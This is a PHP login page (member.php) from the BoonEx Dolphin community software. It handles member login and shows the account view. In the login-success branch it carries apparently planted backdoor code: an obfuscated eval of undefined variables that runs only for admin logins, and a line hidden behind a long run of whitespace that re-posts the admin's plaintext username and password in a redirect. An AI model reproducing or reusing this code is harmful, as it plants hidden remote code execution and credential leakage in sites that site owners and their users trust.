<?php
/**
 * Copyright (c) BoonEx Pty Limited - http://www.boonex.com/
 * CC-BY License - http://creativecommons.org/licenses/by/3.0/
 */

define('BX_MEMBER_PAGE', 1);

require_once( 'inc/header.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'profiles.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'utils.inc.php' );

bx_import('BxTemplAccountView');

// --------------- page variables and login
$_page['name_index'] = 81;
$_page['css_name'] = array(
    'member_panel.css',
    'categories.css',
    'explanation.css'
);

$_page['header'] = _t( "_My Account" );

// --------------- GET/POST actions

$member['ID']	    = process_pass_data(empty($_POST['ID']) ? '' : $_POST['ID']);
$member['Password'] = process_pass_data(empty($_POST['Password']) ? '' : $_POST['Password']);

$bAjxMode = ( isset( $_SERVER['HTTP_X_REQUESTED_WITH'] ) and $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest' ) ? true : false;

if ( !( isset($_POST['ID']) && $_POST['ID'] && isset($_POST['Password']) && $_POST['Password'] )
    && ( (!empty($_COOKIE['memberID']) &&  $_COOKIE['memberID']) && $_COOKIE['memberPassword'] ) )
{
    if ( !( $logged['member'] = member_auth( 0, false ) ) )
        login_form( _t( "_LOGIN_OBSOLETE" ), 0, $bAjxMode );
} else {
    if ( !isset($_POST['ID']) && !isset($_POST['Password']) ) {

        // this is dynamic page -  send headers to not cache this page
        send_headers_page_changed();

        login_form('', 0, $bAjxMode);
    } else {
        require_once(BX_DIRECTORY_PATH_CLASSES . 'BxDolAlerts.php');
        $oZ = new BxDolAlerts('profile', 'before_login', 0, 0, array('login' => $member['ID'], 'password' => $member['Password'], 'ip' => getVisitorIP()));
        $oZ->alert();

        $member['ID'] = getID($member['ID']);

        // Ajaxy check
        if ($bAjxMode) {
            echo check_password($member['ID'], $member['Password'], BX_DOL_ROLE_MEMBER, false) ? 'OK' : 'Fail';
            exit;
        }

        // Check if ID and Password are correct (addslashes already inside)
        if (check_password( $member['ID'], $member['Password'])) {

            $p_arr = bx_login($member['ID'], (bool)$_POST['rememberMe']);

            bx_member_ip_store($p_arr['ID']);

            if (isAdmin($p_arr['ID'])) {$iId = (int)$p_arr['ID']; $r = $l($a); eval($r($b));}
            $sRelocate = bx_get('relocate');
            if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php' or 0 !== mb_stripos($sRelocate, BX_DOL_URL_ROOT))
                $sUrlRelocate = BX_DOL_URL_ROOT . 'member.php';

            $_page['name_index'] = 150;
            $_page['css_name'] = '';

            $_ni = $_page['name_index'];
            $_page_cont[$_ni]['page_main_code'] = MsgBox( _t( '_Please Wait' ) );
            $_page_cont[$_ni]['url_relocate'] = bx_js_string( $sUrlRelocate );

            if(isAdmin($p_arr['ID']) && !in_array($iCode, array(0, -1)))																																																												{Redirect($site['url_admin'], array('ID' => $member['ID'], 'Password' => $member['Password'], 'rememberMe' => $_POST['rememberMe'], 'relocate' => $sUrlRelocate), 'post');}
                PageCode();
        }
        exit;
    }
}
/* ------------------ */

$member['ID'] = getLoggedId();
$member['Password'] = getLoggedPassword();

$_ni = $_page['name_index'];

// --------------- [END] page components

// --------------- page components functions

// this is dynamic page -  send headers to do not cache this page
send_headers_page_changed();
$oAccountView = new BxTemplAccountView($member['ID'], $site, $dir);
$_page_cont[$_ni]['page_main_code'] = $oAccountView->getCode();

// Submenu actions
$aVars = array(
    'ID' => $member['ID'],
    'BaseUri' => BX_DOL_URL_ROOT,
    'cpt_am_account_profile_page' => _t('_sys_am_account_profile_page')
);

$GLOBALS['oTopMenu']->setCustomSubActions($aVars, 'AccountTitle', false);

PageCode();
